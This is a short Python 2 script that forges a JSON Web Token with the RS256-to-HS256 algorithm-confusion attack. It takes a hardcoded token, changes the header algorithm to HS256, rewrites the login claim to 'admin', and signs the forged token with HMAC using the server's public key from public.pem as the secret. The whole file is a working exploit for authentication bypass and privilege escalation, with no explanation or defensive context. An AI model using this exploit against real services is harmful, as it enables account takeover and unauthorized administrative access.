#!/usr/bin/env python

import base64
import json
import sys
import hmac
import hashlib

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImJkbWluIn0.kxfbDWatwNprK1R7jYrAeKi8V-J_oI9cz6GPDwxdF-iPoGl5c837zPhCWDEPyI4kH6jqs90zxnoilTqVh5euU-UlbD-Ekyv6awMS4xsv8AxezhprOABpuByz7WHHqpeYRPFtJTvDDCUQ-Y9fly7idZN19hkWkRiQGjvkK_EnXfKka4zZsO29eknm2JWDhkhVDIOz5BAyNzqaVw3YW51PJTwoAkCpsE8Egfxxz0hX1m06iaHeOCgJF9Q7y01e0OzXzN-__xrSkXl8ZECVISU7x8nEMDKdfT0LwHT5iFDjzlLtWhEPW0asfM-mZb-l7WGAv0W5dqtvChiqcXQIEccX9w"

if jwt.count(".") != 2:
  sys.exit("Error: Must have exactly 2 dots")


header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = base64.urlsafe_b64decode(header_encoded + "===")
payload = base64.urlsafe_b64decode(payload_encoded + "===")
signature = base64.urlsafe_b64decode(signature_encoded + "===")

header_dict = json.loads(header)

if header_dict["alg"] is None:
  sys.exit("Error: Header is missing an alg value")


if header_dict["alg"] != "RS256":
  sys.exit("Error: Header has an alg value other than RS256")


header_dict["alg"] = "HS256"
header_modified = json.dumps(header_dict)
header_modified_encoded = base64.urlsafe_b64encode(header_modified).split("=")[0]


payload_dict = json.loads(payload)

if not payload_dict.has_key("login"):
  sys.exit("Error: Payload is missing a login value")


payload_dict["login"] = "admin"
payload_modified = json.dumps(payload_dict)
payload_modified_encoded = base64.urlsafe_b64encode(payload_modified).split("=")[0]


signature_modified = hmac.new(open("public.pem").read(), msg=header_modified_encoded + "." + payload_modified_encoded, digestmod=hashlib.sha256).digest()
signature_modified_encoded = base64.urlsafe_b64encode(signature_modified).split("=")[0]

print header_modified_encoded + "." + payload_modified_encoded + "." + signature_modified_encoded
